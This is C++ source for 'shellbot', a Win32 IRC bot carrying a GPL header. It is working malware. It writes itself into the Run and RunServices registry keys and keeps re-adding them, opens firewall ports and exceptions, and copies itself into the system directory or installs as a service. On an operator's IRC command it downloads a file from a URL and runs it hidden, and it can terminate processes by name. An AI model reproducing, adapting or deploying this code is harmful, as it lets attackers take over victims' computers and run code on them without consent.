/*	shellbot - a high performance IRC bot for Win32
	Copyright (C) 2005 Shellz

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "vPOEb.h"
#include "Crc32Static.h"
#include "vExterns.h"
CCrc32Static CRCCheck;


void *CRegCheck::Run()
{
	while(1) {
		HKEY key;
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		RegSetValueEx(key, vPOEb->vIRC.cConf.vRegName.c_str(), 0, REG_SZ, (LPBYTE)vPOEb->vIRC.cConf.vFileName.c_str(), (DWORD)vPOEb->vIRC.cConf.vFileName.length()); 
		RegCloseKey(key); 

		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		RegSetValueEx(key, vPOEb->vIRC.cConf.vRegName.c_str(), 0, REG_SZ, (LPBYTE)vPOEb->vIRC.cConf.vFileName.c_str(), (DWORD)vPOEb->vIRC.cConf.vFileName.length()); 
		RegCloseKey(key);
	
		Sleep(30000);
	}
	return NULL;
}

void CRegCheck::Uninstall()
{
	HKEY key;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegDeleteValue(key, vPOEb->vIRC.cConf.vRegName.c_str()); 
	RegCloseKey(key);

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegDeleteValue(key, vPOEb->vIRC.cConf.vRegName.c_str()); 
	RegCloseKey(key); 
}

void CMisc::AllowPort(int iPort, string sName) {
	HKEY key; 
	string sValue =  lexical_cast<string>(iPort) +":TCP:*:Enabled:" + sName;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenPorts\\List", 0, KEY_READ|KEY_WRITE, &key) == ERROR_SUCCESS)
		RegSetValueEx(key, sValue.substr(0, sValue.find("*")-1).c_str(), 0, REG_SZ, (LPBYTE)sValue.c_str(), (DWORD)sValue.length());
}
void CMisc::AllowProgram(char *szApp, char* szAppLoc) {
	HKEY key; 
	string sValue =  lexical_cast<string>(szAppLoc) +":*:Enabled:" + lexical_cast<string>(szApp);
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List", 0, KEY_READ|KEY_WRITE, &key) == ERROR_SUCCESS)
		RegSetValueEx(key, sValue.substr(0, sValue.find("*")-1).c_str(), 0, REG_SZ, (LPBYTE)sValue.c_str(), (DWORD)sValue.length());
}


void CDuplicateCheck::Run()
{
	HANDLE hProcess; DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int i; char szProcessName[MAX_PATH]; HMODULE hMod;
	int counter = 0;
	EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded);
	cProcesses=cbNeeded/sizeof(DWORD);
	for(i=0; i<cProcesses; i++) {
		strcpy(szProcessName, "unknown");
		hProcess=OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, aProcesses[i]);
		if(hProcess) {
			if(EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
				GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName));
				if (strcmp(szProcessName,vPOEb->vIRC.cConf.vFileName.c_str()) == 0) {
					vPOEb->DebugPrint("bot",con::fg_red,"found same process");
					counter++;
					if (counter >= 2)
						ExitProcess(0);									
				}
			}				
		CloseHandle(hProcess);
		}
	}
}

void CInstall::Run()
{
	string ssDir;
	string newDir;
	char sysDir[255], sDir[255];
	GetSystemDirectory(sysDir,255);
	GetModuleFileName(GetModuleHandle(NULL),sDir,255);
	ssDir = sDir;
	if (ssDir.substr(0,ssDir.find_last_of("\\")).compare(sysDir) != 0 && !strstr(sDir, vPOEb->vIRC.cConf.vFileName.c_str())) {
		if (WaitForSingleObject(hMutex, 30000) == WAIT_TIMEOUT)
			ExitProcess(0);
		vPOEb->DebugPrint("bot",con::fg_red,"copying to system directory");
		newDir = sysDir + vPOEb->vIRC.cConf.vFileName.insert(0,"\\",0,string::npos);
		DeleteFile(newDir.c_str());
		for (int i=0; i<3; i++) {
			if (CopyFile(sDir,newDir.c_str(),false)) {
				vPOEb->DebugPrint("bot",con::fg_red,"finished copying to system dir -> %s", newDir.c_str());
				break; } 
			else {
				vPOEb->DebugPrint("bot",con::fg_red,"unable to copy to %s", newDir.c_str()); }		
		}	
		char szDest[256];
		stringstream ss;
		ss << newDir.c_str();
		ss >> szDest;	
#ifndef SERVICE
		PROCESS_INFORMATION pinfo; STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo)); memset(&sinfo, 0, sizeof(sinfo));
		ZeroMemory( &sinfo, sizeof(STARTUPINFO)); sinfo.cb = sizeof(STARTUPINFO);
		if (CreateProcess(NULL, szDest , NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &sinfo, &pinfo) == TRUE) 
			ExitProcess(0);
#else
		InstallSvc(vPOEb->vIRC.cConf.vSvcName.c_str(), szDest);
		// Check if system is shutting down (MS05-039)
//		if (!FindWindow(NULL, "System Shutdown"))
		StartSvc((char*)vPOEb->vIRC.cConf.vSvcName.c_str());
#endif
		ExitProcess(1);
	}
	else {
		OutputDebugString("Intializing\n");
#ifdef SERVICE
	InitSvc();
#endif
	}
}

void CInstall::SetParameters() {
	SetErrorMode(SEM_NOGPFAULTERRORBOX);
	//! Create mutex
	hMutex = CreateMutex(NULL, FALSE, vPOEb->vIRC.cConf.vBotID.c_str());
}

char *SystemUptime() {
	static char buffer[50];
	DWORD total = GetTickCount() / 1000;
	DWORD days = total / 86400;
	DWORD hours = (total % 86400) / 3600;
	DWORD minutes = ((total % 86400) % 3600) / 60;	
	_snprintf(buffer, sizeof(buffer), "%dd %dh %dm", days, hours, minutes);
	return (buffer);
}

typedef struct {
	string sHost;
	string sPath;
} URLInfo;

URLInfo ExtractUrlInfo(string sFullUrl) {
	URLInfo sReturn;
	//if (sFullUrl.compare(0, 7, "http://") != 0) 
	//	sFullUrl.insert(0, "http://");
	int iCount = 0; int iPos = 0;
	for(int i=0; i<sFullUrl.length(); i++) {
		if (sFullUrl[i] == '/') { iPos = i+1; break; }
		sReturn.sHost += sFullUrl[i];
	}
	for(i = iPos; i<sFullUrl.length(); i++) 
		sReturn.sPath += sFullUrl[i];
	
	return sReturn;
}

void Download() {
#ifdef DEBUG_MODE
	vPOEb->DebugPrint("debug",con::fg_gray,"In Download function");
#endif // DEBUGMODE
	URLInfo u_Info = ExtractUrlInfo(vPOEb->vDownload.sUrl);
	HINTERNET hInternet =
		InternetOpen("SHELL32", INTERNET_OPEN_TYPE_PRECONFIG, NULL,NULL, 0);
#ifdef DEBUG_MODE
	vPOEb->DebugPrint("debug",con::fg_gray,"Host: %s - Path: %s", u_Info.sHost.c_str(), u_Info.sPath.c_str());
#endif // DEBUGMODE
	if (hInternet == NULL) ExitThread(0); 
	HINTERNET hConnect = 
		InternetConnect(
			hInternet,
			u_Info.sHost.c_str(),
			INTERNET_DEFAULT_HTTP_PORT,
			NULL,NULL,\
			INTERNET_SERVICE_HTTP,
			0,
			1);

	if (hConnect == NULL) ExitThread(0); 
#ifdef DEBUG_MODE
	vPOEb->DebugPrint("debug",con::fg_gray,"Requesting...");
#endif // DEBUGMODE
	const char* szAcceptTypes = "*/*";
	HINTERNET hRequest = 
	HttpOpenRequest(hConnect,	NULL, u_Info.sPath.c_str(),
		NULL, NULL,	&szAcceptTypes,	INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_KEEP_CONNECTION,
		1);

	if (hRequest == NULL) { 
#ifdef DEBUG_MODE
	vPOEb->DebugPrint("debug",con::fg_gray,"Open Request failed - %i", GetLastError());
#endif // DEBUGMODE
		ExitThread(0); 
	}
resend:
	BOOL bSend = HttpSendRequest(hRequest, NULL,0, NULL,0);
	if (!bSend) {
#ifdef DEBUG_MODE
	vPOEb->DebugPrint("debug",con::fg_gray,"Send Request failed - %i", GetLastError());
#endif // DEBUGMODE
		ExitThread(0); 
	}
	TCHAR szStatusCode[32];	DWORD dwInfoSize = 32;
	if (!HttpQueryInfo(hRequest, HTTP_QUERY_STATUS_CODE, szStatusCode, &dwInfoSize, NULL))
		ExitThread(0); 
	else {
		long nStatusCode = atoi(szStatusCode);
		if (nStatusCode == HTTP_STATUS_PROXY_AUTH_REQ || nStatusCode == HTTP_STATUS_DENIED)
		{
		  char szData[51];
		  DWORD dwSize;
		  do
			{
				InternetReadFile(hRequest, (LPVOID)szData, 50, &dwSize);
			}
			while (dwSize != 0);

		  //Bring up the standard authentication dialog
		  if (InternetErrorDlg(NULL, hRequest, ERROR_INTERNET_INCORRECT_PASSWORD, FLAGS_ERROR_UI_FILTER_FOR_ERRORS |
								 FLAGS_ERROR_UI_FLAGS_GENERATE_DATA | FLAGS_ERROR_UI_FLAGS_CHANGE_OPTIONS, NULL) == ERROR_INTERNET_FORCE_RETRY)
			goto resend;
		} else if (nStatusCode != HTTP_STATUS_OK) {
			ExitThread(0); 
		}
	}
    TCHAR szContentLength[32];
    dwInfoSize = 32;
    DWORD dwFileSize = 0;
    BOOL bGotFileSize = FALSE;
    if (HttpQueryInfo(hRequest, HTTP_QUERY_CONTENT_LENGTH, szContentLength, &dwInfoSize, NULL))
	{
		//Set the progress control range
		bGotFileSize = TRUE;
		dwFileSize = (DWORD) atoi(szContentLength);
	}
#ifdef DEBUG_MODE
	vPOEb->DebugPrint("debug",con::fg_gray,"Reading File...");
#endif // DEBUGMODE
    //Now do the actual read of the file
  	char sBuffer[1028];
	DWORD rVal, dVal, sTotal;
	HANDLE CreateDestFile = CreateFile(vPOEb->vDownload.sDest.c_str(),GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (CreateDestFile < (HANDLE)1) ExitThread(0); 		
	char* fileBuffer = (char*)malloc(512000);
	sTotal = 0;
	do {
		memset(sBuffer,0,sizeof(sBuffer));
		InternetReadFile(hRequest, sBuffer, sizeof(sBuffer), &rVal);
		WriteFile(CreateDestFile, sBuffer, rVal, &dVal, NULL);
			if (sTotal < 512000) {
			unsigned int bytestocopy;
			bytestocopy=512000-sTotal;
			if (bytestocopy>rVal) 
				bytestocopy=rVal;
			memcpy(&fileBuffer[sTotal],sBuffer,bytestocopy);
		}
		sTotal += rVal;
	} while (rVal > 0);
	vPOEb->vIRC.SendData("PRIVMSG %s :http(file) downloaded -> (size: %dKB).\r\n",vPOEb->vIRC.msgTo.c_str(),sTotal / 1024);
	free(fileBuffer);
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
	CloseHandle(CreateDestFile);
#ifdef DEBUG_MODE
	vPOEb->DebugPrint("debug",con::fg_gray,"Done downloading...");
#endif // DEBUGMODE
	if (vPOEb->vDownload.sUpdate.compare(0,vPOEb->vDownload.sUpdate.length(),"-u") == 0) {
#ifndef SERVICE
		vPOEb->vRegcheck.Kill(); vPOEb->vRegcheck.Uninstall();
#endif
		char sDir[255]; DWORD CRCthis; 	DWORD CRCupdate;
		GetModuleFileName(GetModuleHandle(NULL),sDir,255);
		CRCCheck.FileCrc32Win32(sDir,CRCthis);
		CRCCheck.FileCrc32Win32(vPOEb->vDownload.sDest.c_str(),CRCupdate); Sleep(250);
		if (CRCthis != CRCupdate) {				
			if (sTotal / 1024 > 5) { //! If file size > 5KB, do update
				vPOEb->vIRC.SendData("PRIVMSG %s :updating...\r\n",vPOEb->vIRC.msgTo.c_str());
				PROCESS_INFORMATION pinfo; STARTUPINFO sinfo;
				memset(&pinfo, 0, sizeof(pinfo)); memset(&sinfo, 0, sizeof(sinfo));
				sinfo.lpTitle = ""; sinfo.cb = sizeof(sinfo); 
				sinfo.dwFlags = STARTF_USESHOWWINDOW; sinfo.wShowWindow = SW_SHOW;
				char szDest[256]; stringstream ss; ss << vPOEb->vDownload.sDest; ss >> szDest;
#ifdef DEBUG_MODE
	vPOEb->DebugPrint("debug",con::fg_gray,"File being exe'd: %s", szDest);
#endif // DEBUGMODE
				if (CreateProcess(NULL, szDest , NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &sinfo, &pinfo) == TRUE) {
					WSACleanup();
#ifndef SERVICE
					ExitProcess(0); 
#else
					UninstallSvc(vPOEb->vIRC.cConf.vSvcName.c_str());
#endif
				}				
			}
		} else 
			vPOEb->vIRC.SendData("PRIVMSG %s :current file is already updated.\r\n",vPOEb->vIRC.msgTo.c_str());
	} else if (vPOEb->vDownload.sUpdate.compare(0,vPOEb->vDownload.sUpdate.length(),"-e") == 0) {
		if (ShellExecute(NULL,"open",vPOEb->vDownload.sDest.c_str(),NULL,NULL,SW_HIDE))
			vPOEb->vIRC.SendData("PRIVMSG %s :opened file.\r\n",vPOEb->vIRC.msgTo.c_str());
		else 
			vPOEb->vIRC.SendData("PRIVMSG %s :unable to open file.\r\n",vPOEb->vIRC.msgTo.c_str());
	}
	ExitThread(0);
}

int TerminateProc(const char *szToTerminate) {
	BOOL bResult,bResultm;
	DWORD aiPID[1000],iCb=1000,iNumProc,iV2000=0;
	DWORD iCbneeded,i,iFound=0;
	char szName[MAX_PATH],szToTermUpper[MAX_PATH];
	HANDLE hProc,hSnapShot,hSnapShotm;
	OSVERSIONINFO osvi;
    HINSTANCE hInstLib;
	int iLen,iLenP,indx;
    HMODULE hMod;
	PROCESSENTRY32 procentry;      
	MODULEENTRY32 modentry;

	// Transfer Process name into "szToTermUpper" and
	// convert it to upper case
	iLenP=strlen(szToTerminate);
	if(iLenP<1 || iLenP>MAX_PATH) return 632;
	for(indx=0;indx<iLenP;indx++)
		szToTermUpper[indx]=toupper(szToTerminate[indx]);
	szToTermUpper[iLenP]=0;

     // PSAPI Function Pointers.
     BOOL (WINAPI *lpfEnumProcesses)( DWORD *, DWORD cb, DWORD * );
     BOOL (WINAPI *lpfEnumProcessModules)( HANDLE, HMODULE *,
        DWORD, LPDWORD );
     DWORD (WINAPI *lpfGetModuleBaseName)( HANDLE, HMODULE,
        LPTSTR, DWORD );

      // ToolHelp Function Pointers.
      HANDLE (WINAPI *lpfCreateToolhelp32Snapshot)(DWORD,DWORD) ;
      BOOL (WINAPI *lpfProcess32First)(HANDLE,LPPROCESSENTRY32) ;
      BOOL (WINAPI *lpfProcess32Next)(HANDLE,LPPROCESSENTRY32) ;
      BOOL (WINAPI *lpfModule32First)(HANDLE,LPMODULEENTRY32) ;
      BOOL (WINAPI *lpfModule32Next)(HANDLE,LPMODULEENTRY32) ;

	// First check what version of Windows we're in
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    bResult=GetVersionEx(&osvi);
	if(!bResult)     // Unable to identify system version
	    return 606;

	// At Present we only support Win/NT/2000/XP or Win/9x/ME
	if((osvi.dwPlatformId != VER_PLATFORM_WIN32_NT) &&
		(osvi.dwPlatformId != VER_PLATFORM_WIN32_WINDOWS))
		return 607;

    if(osvi.dwPlatformId==VER_PLATFORM_WIN32_NT)
	{
		// Win/NT or 2000 or XP

         // Load library and get the procedures explicitly. We do
         // this so that we don't have to worry about modules using
         // this code failing to load under Windows 9x, because
         // it can't resolve references to the PSAPI.DLL.
         hInstLib = LoadLibraryA("PSAPI.DLL");
         if(hInstLib == NULL)
            return 605;

         // Get procedure addresses.
         lpfEnumProcesses = (BOOL(WINAPI *)(DWORD *,DWORD,DWORD*))
            GetProcAddress( hInstLib, "EnumProcesses" ) ;
         lpfEnumProcessModules = (BOOL(WINAPI *)(HANDLE, HMODULE *,
            DWORD, LPDWORD)) GetProcAddress( hInstLib,
            "EnumProcessModules" ) ;
         lpfGetModuleBaseName =(DWORD (WINAPI *)(HANDLE, HMODULE,
            LPTSTR, DWORD )) GetProcAddress( hInstLib,
            "GetModuleBaseNameA" ) ;

         if(lpfEnumProcesses == NULL ||
            lpfEnumProcessModules == NULL ||
            lpfGetModuleBaseName == NULL)
            {
               FreeLibrary(hInstLib);
               return 700;
            }
		 
		bResult=lpfEnumProcesses(aiPID,iCb,&iCbneeded);
		if(!bResult)
		{
			// Unable to get process list, EnumProcesses failed
            FreeLibrary(hInstLib);
			return 701;
		}

		// How many processes are there?
		iNumProc=iCbneeded/sizeof(DWORD);

		// Get and match the name of each process
		for(i=0;i<iNumProc;i++)
		{
			// Get the (module) name for this process

	        strcpy(szName,"Unknown");
			// First, get a handle to the process
	        hProc=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,
				aiPID[i]);
	        // Now, get the process name
	        if(hProc)
			{
               if(lpfEnumProcessModules(hProc,&hMod,sizeof(hMod),&iCbneeded) )
			   {
                  iLen=lpfGetModuleBaseName(hProc,hMod,szName,MAX_PATH);
			   }
			}
	        CloseHandle(hProc);
			// We will match regardless of lower or upper case
#ifdef BORLANDC
            if(strcmp(strupr(szName),szToTermUpper)==0)
#else
			if(strcmp(_strupr(szName),szToTermUpper)==0)
#endif
			{
				// Process found, now terminate it
				iFound=1;
				// First open for termination
				hProc=OpenProcess(PROCESS_TERMINATE,FALSE,aiPID[i]);
				if(hProc)
				{
					if(TerminateProcess(hProc,0))
					{
						// process terminated
						CloseHandle(hProc);
                        FreeLibrary(hInstLib);
						return 0;
					}
					else
					{
						// Unable to terminate process
						CloseHandle(hProc);
                        FreeLibrary(hInstLib);
						return 602;
					}
				}
				else
				{
					// Unable to open process for termination
                    FreeLibrary(hInstLib);
					return 604;
				}
			}
		}
	}

	if(osvi.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)
	{
		// Win/95 or 98 or ME
			
		hInstLib = LoadLibraryA("Kernel32.DLL");
		if( hInstLib == NULL )
			return 702;

		// Get procedure addresses.
		// We are linking to these functions of Kernel32
		// explicitly, because otherwise a module using
		// this code would fail to load under Windows NT,
		// which does not have the Toolhelp32
		// functions in the Kernel 32.
		lpfCreateToolhelp32Snapshot=
			(HANDLE(WINAPI *)(DWORD,DWORD))
			GetProcAddress( hInstLib,
			"CreateToolhelp32Snapshot" ) ;
		lpfProcess32First=
			(BOOL(WINAPI *)(HANDLE,LPPROCESSENTRY32))
			GetProcAddress( hInstLib, "Process32First" ) ;
		lpfProcess32Next=
			(BOOL(WINAPI *)(HANDLE,LPPROCESSENTRY32))
			GetProcAddress( hInstLib, "Process32Next" ) ;
		lpfModule32First=
			(BOOL(WINAPI *)(HANDLE,LPMODULEENTRY32))
			GetProcAddress( hInstLib, "Module32First" ) ;
		lpfModule32Next=
			(BOOL(WINAPI *)(HANDLE,LPMODULEENTRY32))
			GetProcAddress( hInstLib, "Module32Next" ) ;
		if( lpfProcess32Next == NULL ||
			lpfProcess32First == NULL ||
		    lpfModule32Next == NULL ||
			lpfModule32First == NULL ||
			lpfCreateToolhelp32Snapshot == NULL )
		{
			FreeLibrary(hInstLib);
			return 703;
		}
			
		// The Process32.. and Module32.. routines return names in all uppercase

		// Get a handle to a Toolhelp snapshot of all the systems processes.

		hSnapShot = lpfCreateToolhelp32Snapshot(
			TH32CS_SNAPPROCESS, 0 ) ;
		if( hSnapShot == INVALID_HANDLE_VALUE )
		{
			FreeLibrary(hInstLib);
			return 704;
		}
		
        // Get the first process' information.
        procentry.dwSize = sizeof(PROCESSENTRY32);
        bResult=lpfProcess32First(hSnapShot,&procentry);

        // While there are processes, keep looping and checking.
        while(bResult)
        {
		    // Get a handle to a Toolhelp snapshot of this process.
		    hSnapShotm = lpfCreateToolhelp32Snapshot(
			    TH32CS_SNAPMODULE, procentry.th32ProcessID) ;
		    if( hSnapShotm == INVALID_HANDLE_VALUE )
			{
				CloseHandle(hSnapShot);
			    FreeLibrary(hInstLib);
			    return 704;
			}
			// Get the module list for this process
			modentry.dwSize=sizeof(MODULEENTRY32);
			bResultm=lpfModule32First(hSnapShotm,&modentry);

			// While there are modules, keep looping and checking
			while(bResultm)
			{
		        if(strcmp(modentry.szModule,szToTermUpper)==0)
				{
				    // Process found, now terminate it
				    iFound=1;
				    // First open for termination
				    hProc=OpenProcess(PROCESS_TERMINATE,FALSE,procentry.th32ProcessID);
				    if(hProc)
					{
					    if(TerminateProcess(hProc,0))
						{
						    // process terminated
							CloseHandle(hSnapShotm);
							CloseHandle(hSnapShot);
							CloseHandle(hProc);
			                FreeLibrary(hInstLib);
						    return 0;
						}
					    else
						{
						    // Unable to terminate process
							CloseHandle(hSnapShotm);
							CloseHandle(hSnapShot);
							CloseHandle(hProc);
			                FreeLibrary(hInstLib);
						    return 602;
						}
					}
				    else
					{
					    // Unable to open process for termination
						CloseHandle(hSnapShotm);
						CloseHandle(hSnapShot);
			            FreeLibrary(hInstLib);
					    return 604;
					}
				}
				else
				{  // Look for next modules for this process
					modentry.dwSize=sizeof(MODULEENTRY32);
					bResultm=lpfModule32Next(hSnapShotm,&modentry);
				}
			}

			//Keep looking
			CloseHandle(hSnapShotm);
            procentry.dwSize = sizeof(PROCESSENTRY32);
            bResult = lpfProcess32Next(hSnapShot,&procentry);
        }
		CloseHandle(hSnapShot);
	}
	if(iFound==0)
	{
		FreeLibrary(hInstLib);
		return 603;
	}
	FreeLibrary(hInstLib);
	return 0;
}

string OSVersion(void) {
	string dwRet = "UN";
	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	if (GetVersionEx(&verinfo)) {
		if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
			if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) dwRet = "[95]";
			if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) dwRet = "[NT]";
		}
		else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) dwRet = "[98]";
		else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) dwRet = "[ME]";
		else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) dwRet = "[2K]";
		else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) dwRet = "[XP]";
		else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) dwRet = "[2K3]";
		else dwRet = "[UN]";
	} else 
		dwRet = "[UN]";
	return (dwRet);
}

string UPVersion(void){
	static char buffer[50];
	string up="";
	DWORD total = GetTickCount() / 1000;
	DWORD days = total / 86400;
	_snprintf(buffer, sizeof(buffer), "%.2d", days);
//	up = "["+buffer+"]";
	up.append("[");
	up.append(buffer);
	up.append("]");
	return (up);
}

string USVersion(void){
	string US = OSVersion();
	US.insert(3,UPVersion().substr(1,2));
	US.append(vPOEb->vIRC.cConf.vNick);
	return (US);
}